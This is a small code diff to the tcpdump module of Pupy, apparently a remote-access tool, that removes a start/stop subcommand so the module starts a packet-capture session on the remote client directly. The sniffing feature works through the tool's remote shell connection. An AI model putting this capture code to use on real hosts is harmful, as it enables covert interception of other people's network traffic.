@@ -37,7 +37,7 @@ class TcpdumpModule(PupyModule):
         self.arg_parser.add_argument("-i", "--iface", default=None, help="change default iface")
         self.arg_parser.add_argument("--timeout", type=int, default=None, help="stop the capture after timeout seconds")
         self.arg_parser.add_argument("--bpf", required=True, help="use a BPF (Warning: It is highly advised to whitelist pupy's shell IP/PORT you are currently using to avoid a nasty Larsen effect)") #yup mandatory cause you have to put pupy's IP/PORT anyway
-        self.arg_parser.add_argument("command", choices=["start", "stop"])
+        #self.arg_parser.add_argument("command", choices=["start", "stop"])
         self.sniff_sess=None
 
 
@@ -56,17 +56,10 @@ class TcpdumpModule(PupyModule):
 
         if args.timeout==None and args.count==0:
             raise PupyModuleError("--timeout or --count options are mandatory for now.")#TODO patch scapy to have an interruptible sniff() function
-        if args.command=="start":
-            if self.sniff_sess!=None:
-                raise PupyModuleError("There is already a sniff session running, close it first to start a new one")
-            self.sniff_sess=self.client.conn.modules["tcpdump"].SniffSession(gen_cb_function(pcap_writer=pktwriter), bpf=args.bpf, timeout=args.timeout, count=args.count, iface=args.iface)
-            with redirected_stdio(self.client.conn):
-                self.sniff_sess.start()
-        if args.command=="stop":
-            if self.sniff_sess is None:
-                raise PupyModuleError("No sniff session running")
-            self.sniff_sess.stop()
-            self.success("tcpdump stopped")
+
+        self.sniff_sess=self.client.conn.modules["tcpdump"].SniffSession(gen_cb_function(pcap_writer=pktwriter), bpf=args.bpf, timeout=args.timeout, count=args.count, iface=args.iface)
+        #with redirected_stdio(self.client.conn):
+        self.sniff_sess.start()
 
                 
 
